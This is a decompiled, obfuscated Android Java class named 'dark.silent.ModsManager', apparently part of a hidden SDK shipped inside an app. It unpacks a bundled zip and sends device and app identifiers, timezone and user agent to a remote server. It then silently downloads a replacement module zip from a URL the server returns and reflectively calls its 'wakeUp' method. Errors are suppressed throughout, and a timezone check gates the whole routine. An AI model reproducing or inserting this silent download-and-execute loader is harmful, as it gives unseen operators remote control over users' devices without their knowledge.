package dark.silent;

import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Handler.Callback;
import android.os.HandlerThread;
import android.os.Message;
import com.ape.secrecy.provider.EncryptFileOldDbHelper;
import com.handmark.pulltorefresh.library.PullToRefreshBase;
import com.squareup.leakcanary.android.noop.BuildConfig;
import dark.silent.a.a;
import dark.silent.a.b;
import dark.silent.b.c;
import dark.silent.b.d;
import dark.silent.b.e;
import dark.silent.b.f;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import org.json.JSONObject;
import org.swiftp.Defaults;

public class ModsManager {
    private static ModsManager a = null;
    private static final Object b = new Object();
    private HandlerThread c;
    private Handler d;
    private b e;
    private a f;
    private Callback g = new Callback(this) {
        final /* synthetic */ ModsManager a;

        {
            this.a = r1;
        }

        public final boolean handleMessage(Message msg) {
            if (this.a.e != null) {
                b a;
                if (!this.a.e.a()) {
                    a b;
                    String a2;
                    a b2 = this.a.f;
                    b a3 = this.a.e;
                    if (e.a()) {
                        try {
                            InputStream open = b2.a.getAssets().open("moast.zip");
                            if (open != null) {
                                dark.silent.b.b.a(open, b2.b);
                            }
                        } catch (Exception e) {
                        }
                        b = this.a.f;
                        a = this.a.e;
                        a2 = dark.silent.b.b.a(b.b, "meta.json");
                        if (!(a2 == null || d.a(a2) == null || !b.b.exists())) {
                            a.a(b.a, b.b);
                        }
                    }
                    try {
                        Object obj;
                        String str;
                        File file = new File(b2.a.getDir("tmpmof", 0), "moast.zip");
                        String b3 = dark.silent.b.b.b(b2.b);
                        JSONObject jSONObject = new JSONObject();
                        jSONObject.put("app", a3.a);
                        jSONObject.put("app_v", f.a(b2.a));
                        jSONObject.put("key", a3.b);
                        jSONObject.put("ch", a3.c);
                        jSONObject.put("secret", f.a(jSONObject.get("key") + "@" + jSONObject.get("app") + Defaults.chrootDir + jSONObject.get("ch") + "#" + jSONObject.get("app_v")));
                        String str2 = EncryptFileOldDbHelper.MD5;
                        if (b3 == null) {
                            obj = BuildConfig.VERSION_NAME;
                        } else {
                            str = b3;
                        }
                        jSONObject.put(str2, obj);
                        jSONObject.put("tz", f.b());
                        jSONObject.put("ua", f.a());
                        c.a a4 = c.a(new String(b2.c), jSONObject);
                        if (a4 != null && a4.a == PullToRefreshBase.SMOOTH_SCROLL_DURATION_MS) {
                            JSONObject a5 = d.a(a4.b);
                            if (a5 != null) {
                                String a6 = d.a(a5, "url");
                                str2 = d.a(a5, EncryptFileOldDbHelper.MD5);
                                d.a(a5, "v");
                                d.a(a5, "b");
                                if (!(str2 == null || a6 == null || (b3 != null && (b3 == null || b3.compareToIgnoreCase(str2) == 0)))) {
                                    c.a(a6, file);
                                    str = dark.silent.b.b.b(file);
                                    if (file.exists() && str2.compareToIgnoreCase(str) == 0) {
                                        dark.silent.b.b.a(b2.b);
                                        try {
                                            dark.silent.b.b.a(file, b2.b);
                                        } catch (IOException e2) {
                                        }
                                        dark.silent.b.b.a(file);
                                    }
                                }
                            }
                        }
                        b = this.a.f;
                        a = this.a.e;
                        a2 = dark.silent.b.b.a(b.b, "meta.json");
                        a.a(b.a, b.b);
                    } catch (Exception e3) {
                    }
                }
                a = this.a.e;
                Intent intent = (Intent) msg.obj;
                if (a.a()) {
                    try {
                        dark.silent.b.a.a(a.d, "wakeUp", new Class[]{Intent.class}, new Object[]{intent});
                    } catch (Exception e4) {
                    }
                }
            }
            return true;
        }
    };

    private ModsManager(Context context) {
        int i = 1;
        this.f = new a(context.getApplicationContext());
        this.e = null;
        if (f.b().startsWith("00", 1)) {
            i = 0;
        }
        if (i != 0) {
            this.c = new HandlerThread("00");
            this.c.start();
            this.d = new Handler(this.c.getLooper(), this.g);
        }
    }

    public static ModsManager get(Context context) {
        synchronized (b) {
            if (a == null) {
                a = new ModsManager(context);
            }
        }
        return a;
    }

    public synchronized void initParams(String appId, String key, String channel) {
        if (this.e == null) {
            this.e = new b(appId, key, channel);
            b bVar = this.e;
            bVar.e = null;
            bVar.f = null;
        }
    }

    public void processIntent(Intent intent) {
        if (this.d != null) {
            Message obtain = Message.obtain();
            obtain.obj = intent;
            this.d.sendMessage(obtain);
        }
    }
}
